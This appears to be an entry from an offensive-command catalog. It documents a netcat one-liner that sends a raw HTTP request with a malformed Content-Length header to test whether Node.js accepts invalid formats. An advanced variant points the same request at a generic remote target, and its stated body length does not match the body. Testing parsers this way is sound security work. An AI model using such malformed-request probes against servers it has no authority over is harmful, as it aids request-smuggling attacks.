---
data: >-
  echo -en "GET / HTTP/1.1\r\nHost: localhost:5000\r\nContent-Length :
  5\r\n\r\nhello" | nc localhost 5000
tags:
  - http
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: cb2511dc-1e1b-456c-ae28-ee43874206f8
created_at: '2025-12-13T09:01:21.662Z'
updated_at: '2025-12-13T09:01:21.662Z'
verified: false
validated: true
submitted: true
---
# Echo NC Send Request

## Command

```bash
echo -en "GET / HTTP/1.1\r\nHost: localhost:5000\r\nContent-Length : 5\r\n\r\nhello" | nc localhost 5000
```

## Description

Crafts a raw HTTP request with a malformed header and sends it via netcat to a target server, used to demonstrate acceptance of invalid formats in Node.js.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-en` | Enables interpretation of backslash escapes and suppresses trailing newline | Yes |
| `| nc localhost 5000` | Pipes the output to netcat to send to localhost on port 5000 | Yes |
| `GET / HTTP/1.1\r\nHost: localhost:5000\r\nContent-Length : 5\r\n\r\nhello` | The raw HTTP request string with malformed header and body | Yes |

## Examples

### Basic Usage

```bash
echo -en "GET / HTTP/1.1\r\nHost: localhost:5000\r\nContent-Length : 5\r\n\r\nhello" | nc localhost 5000
```

### Advanced Usage

```bash
echo -en "POST / HTTP/1.1\r\nHost: target\r\nContent-Length : 10\r\n\r\ndatahere" | nc target 80
```

## Expected Output

Server response: 'Body length: 5 Body: hello', confirming processing of the malformed request.

## Related

- [[procedures/Send-Malformed-HTTP-Request]]
- [[tools/echo]]
- [[tools/nc]]
